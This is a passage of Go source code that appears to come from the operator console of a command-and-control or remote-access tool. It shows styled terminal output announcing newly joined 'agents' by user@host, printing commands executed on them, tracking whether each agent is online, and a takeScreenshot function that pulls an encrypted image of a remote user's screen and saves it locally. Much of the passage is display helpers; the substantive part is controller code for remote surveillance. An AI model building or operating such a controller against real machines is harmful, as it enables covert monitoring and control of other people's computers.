		styleMuted(padRight(os, 12)),
		lipgloss.NewStyle().Foreground(statusColor).Render(statusIcon),
		lipgloss.NewStyle().Foreground(statusColor).Render(status))
}

func printAgentJoin(user, host, os string) {
	fmt.Print("\r" + strings.Repeat(" ", 80) + "\r")
	fmt.Printf("  %s New agent: %s (%s)\n",
		styleSuccess("[+]"),
		styleHighlight(user+"@"+host),
		styleMuted(os))
}

func printExecuting(user, host, cmd string) {
	fmt.Printf("%s Executing on %s@%s: %s\n", styleInfo("[*]"), styleBold(user), styleBold(host), styleMuted(cmd))
}

func printCommandOutput(output string) {
	fmt.Println(lipgloss.NewStyle().Foreground(colorText).Render(output))
}

// Styles
func stylePrimary(s string) string {
	return lipgloss.NewStyle().Foreground(colorPrimary).Render(s)
}

func styleInfo(s string) string {
	return lipgloss.NewStyle().Foreground(cyan).Render(s)
}

func styleSuccess(s string) string {
	return lipgloss.NewStyle().Foreground(green).Render(s)
}

func styleError(s string) string {
	return lipgloss.NewStyle().Foreground(red).Render(s)
}

func styleWarning(s string) string {
	return lipgloss.NewStyle().Foreground(yellow).Render(s)
}

func styleMuted(s string) string {
	return lipgloss.NewStyle().Foreground(colorMuted).Render(s)
}

func styleText(s string) string {
	return lipgloss.NewStyle().Foreground(colorText).Render(s)
}

func styleHighlight(s string) string {
	return lipgloss.NewStyle().Foreground(colorHighlight).Bold(true).Render(s)
}

func styleCommand(s string) string {
	return lipgloss.NewStyle().Foreground(colorHighlight).Render(s)
}

func styleBold(s string) string {
	return lipgloss.NewStyle().Bold(true).Foreground(colorText).Render(s)
}

// utils
func padRight(s string, width int) string {
	if len(s) < width {
		return s + strings.Repeat(" ", width-len(s))
	}
	return s
}

func formatDuration(d time.Duration) string {
	days := int(d.Hours() / 24)
	hours := int(d.Hours()) % 24
	minutes := int(d.Minutes()) % 60

	if days > 0 {
		return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
	}
	if hours > 0 {
		return fmt.Sprintf("%dh %dm", hours, minutes)
	}
	return fmt.Sprintf("%dm", minutes)
}

func getAgentStatus(lastSeen time.Time) string {
	elapsed := time.Since(lastSeen)
	if elapsed < 30*time.Second {
		return "on"
	} else if elapsed < 2*time.Minute {
		return "idle"
	}
	return "off"
}

func takeScreenshot(ctx context.Context, h host.Host, agentNum string) {
	targetAgent := resolveAgent(agentNum)
	if targetAgent == nil {
		return
	}

	printExecuting(targetAgent.Username, targetAgent.Hostname, "Taking screenshot...")

	stream, err := h.NewStream(ctx, targetAgent.ID, ScreenshotProtocol)
	if err != nil {
		printError("Connection failed: " + err.Error())
		return
	}
	defer stream.Close()

	// Wait for response (Size + Image)
	reader := bufio.NewReader(stream)
	
	// Read size (encrypted JSON or just line?)
	// Let's reuse FileResponse for simplicity or just read a line with size
	respStr, err := reader.ReadString('\n')
	if err != nil {
		printError("Failed to read response: " + err.Error())
		return
	}

	decryptedResp, err := securityMgr.DecryptString(strings.TrimSpace(respStr))
	if err != nil {
		printError("Decryption failed: " + err.Error())
		return
	}

	var resp FileResponse
	if json.Unmarshal([]byte(decryptedResp), &resp) != nil {
		printError("Invalid response format")
		return
	}

	if !resp.Success {
		printError("Screenshot failed: " + resp.Message)
		return
	}

	// Create screenshots directory
	if err := os.MkdirAll("screenshots", 0755); err != nil {
		printError("Failed to create screenshots directory: " + err.Error())
		return
	}

	// Generate filename
	timestamp := time.Now().Format("20060102-150405")
	filename := fmt.Sprintf("screenshots/%s_%s_%s.png", targetAgent.Username, targetAgent.Hostname, timestamp)

	f, err := os.Create(filename)
	if err != nil {
		printError("Failed to create file: " + err.Error())
		return
	}
	defer f.Close()

	fmt.Print(styleMuted(fmt.Sprintf("  Receiving image (%d bytes)... ", resp.Size)))
	if err := receiveEncryptedFile(reader, f, resp.Size); err != nil {
		fmt.Println()
		printError("Receive failed: " + err.Error())
		return
	}
	fmt.Println()
	printSuccess(fmt.Sprintf("Screenshot saved to %s", filename))
}
